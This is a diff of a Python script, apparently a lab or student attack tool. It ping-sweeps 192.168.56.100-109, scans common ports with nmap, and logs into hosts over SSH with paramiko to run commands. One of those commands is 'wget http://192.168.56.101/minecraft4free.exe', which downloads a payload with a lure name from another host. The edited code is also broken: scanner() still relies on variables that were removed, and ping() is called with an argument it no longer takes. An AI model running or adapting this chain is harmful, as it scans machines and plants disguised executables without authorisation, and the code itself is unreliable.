@@ -5,16 +5,8 @@ import nmap
 import subprocess
 import paramiko
 import main
-#help="""---------------- HOST SCAN ---------------
-#	python hello.py [options]
-#	options -s startip
-#	options -e endip
-#	EX . python hello.py -s 10.1.1.0 -e 10.1.1.225
-#	"""
+#import netifaces
 
-if len(sys.argv)!=5:
-	print(help)
-	sys.exit(0)
 
 IpList = []
 
@@ -24,19 +16,19 @@ IpList = []
 
 def nmaper():
     portscan = nmap.PortScanner()
-    #startport = 1
-    #endport = 1023
-    portnum = 22
-    for ips in IpList:
-        #for portnum in range (startport, endport + 1):
-        portscan.scan(ips, str(portnum))
-        portscan = portscan['scan'][ips]['tcp'][portnum]['state']
-        print(f'port {portnum} is {portscan}.')
+    scannedports = [20,21,22,23,25,53,67,68,69,80,110,443,1337,3389,13337]
+    #portnum = 22
+    for target in IpList:
+        for portnum in (scannedports):
+            results = portscan.scan(target, str(portnum))
+            results = results['scan'][target]['tcp'][portnum]['state']
+            if (results == "open"):
+                print(f'{target} port {portnum} is {results}.')
+
+        print("-----------------------------------")
     #once all open ports have been found
-        if portscan == 'open':
-            yes = "yes"
-    
-def shher():
+        
+def ssher():
     command = 'ls'
     command2 = "wget http://192.168.56.101/minecraft4free.exe"
     #command3 = ""
@@ -56,27 +48,48 @@ def shher():
 
     client.close()
 
+def ping():
+    ipbase = "192.168.56."
+    for x in range (100,110):
+        ip = ipbase + str(x)
+        if not os.system('ping -n 1 '+ip+' >'+ip):
+            print(ip)
+            IpList.append(ip)
 
-
-def ping(ip):
-    
-    #x = 0
-    if not os.system('ping '+ip+' >'+ip):
-        print(ip)
-        #while ("yes" == "yes"):
-         #   IpList[x] += ip
-         #   x +=1
-        IpList.append(ip)
-        #print(IpList)
     os.system('del '+ip)
-#print(IpList)
-startip=list(map(int,sys.argv[sys.argv.index('-s')+1].strip().split('.')))
-endip=list(map(int,sys.argv[sys.argv.index('-e')+1].strip().split('.')))
 
-#print(IpList)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 def scanner():  
+
     while startip != endip:
-#    ping(startip)
     
         ip='.'.join(map(str,startip))
         threading.Thread(target=ping,args=(ip,)).start()
@@ -95,16 +108,3 @@ def scanner():
                     startip[1]+=1
             else:
                 startip[2]+=1
-
-
-
-def counter():
-    x = 0 
-    while (x < 100):
-        print(x)
-        x +=1
-
-
-
-        
-#print(IpList)
